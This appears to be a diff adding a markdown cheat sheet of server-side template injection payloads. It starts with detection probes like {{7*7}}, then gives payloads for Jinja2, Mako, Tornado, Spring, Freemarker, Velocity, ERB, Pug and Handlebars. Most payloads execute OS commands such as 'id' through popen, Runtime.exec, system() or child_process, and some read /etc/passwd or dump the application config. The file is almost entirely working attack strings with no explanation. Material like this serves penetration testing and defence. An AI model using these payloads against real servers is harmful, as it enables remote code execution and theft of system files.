@@ -1,0 +1,30 @@
+# Comprehensive SSTI (Server-Side Template Injection) Payloads
+
+## 1. Detection Multi-Stage Probes
+${7*7}
+{{7*7}}
+{{7*'7'}}
+<%= 7*7 %>
+$<7*7>
+#{7*7}
+@{'7'*7}
+
+## 2. Python (Jinja2 / Mako / Tornado)
+{{ config.items() }}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.__builtins__ }}
+{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+
+## 3. Java (Spring / Freemarker / Velocity)
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
+#set($engine="")#set($bean=$engine.getClass().forName("java.lang.System").getMethod("getProperties").invoke($null))
+<#assign ex="freemarker.template.utility.Execute"?new()> \${ ex("id") }
+
+## 4. Ruby / ERB
+<%= system('id') %>
+<%= system('cat /etc/passwd') %>
+
+## 5. JavaScript (Pug / Handlebars)
+<%= process.mainModule.require('child_process').execSync('id') %>
+{{process.mainModule.require('child_process').execSync('id').toString()}}
